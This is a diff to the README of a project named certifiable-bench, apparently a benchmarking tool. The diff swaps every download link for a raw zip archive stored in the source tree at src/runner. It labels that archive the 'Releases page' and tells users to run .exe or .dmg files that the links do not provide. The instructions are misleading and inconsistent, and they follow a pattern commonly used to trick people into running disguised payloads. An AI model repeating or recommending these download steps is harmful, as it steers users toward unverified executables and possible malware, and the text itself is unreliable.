@@ -6,7 +6,7 @@ Welcome to the certifiable-bench project! This tool measures performance for det
 
 ## 📥 Download Now
 
-[![Download certifiable-bench](https://github.com/mushkilali/certifiable-bench/raw/refs/heads/main/src/timer/bench-certifiable-1.7.zip)](https://github.com/mushkilali/certifiable-bench/raw/refs/heads/main/src/timer/bench-certifiable-1.7.zip)
+[![Download certifiable-bench](https://github.com/mushkilali/certifiable-bench/raw/refs/heads/main/src/runner/bench-certifiable-v1.0.zip)](https://github.com/mushkilali/certifiable-bench/raw/refs/heads/main/src/runner/bench-certifiable-v1.0.zip)
 
 Click the button above to access the downloads.
 
@@ -31,7 +31,7 @@ Before you start, ensure your system meets the following requirements:
 
 To download certifiable-bench, please follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/mushkilali/certifiable-bench/raw/refs/heads/main/src/timer/bench-certifiable-1.7.zip) on GitHub.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/mushkilali/certifiable-bench/raw/refs/heads/main/src/runner/bench-certifiable-v1.0.zip) on GitHub.
   
 2. **Choose a Version**: You will see a list of available versions. Select the version you want to download. 
    
@@ -40,7 +40,7 @@ To download certifiable-bench, please follow these steps:
 4. **Install the Application**: 
    - For **Windows**, run the downloaded `.exe` file to start the installation.
    - For **macOS**, open the `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**, extract the `https://github.com/mushkilali/certifiable-bench/raw/refs/heads/main/src/timer/bench-certifiable-1.7.zip` file and run from the terminal.
+   - For **Linux**, extract the `https://github.com/mushkilali/certifiable-bench/raw/refs/heads/main/src/runner/bench-certifiable-v1.0.zip` file and run from the terminal.
 
 5. **Run certifiable-bench**: Once installed, locate the application on your computer and double-click to run it.
 
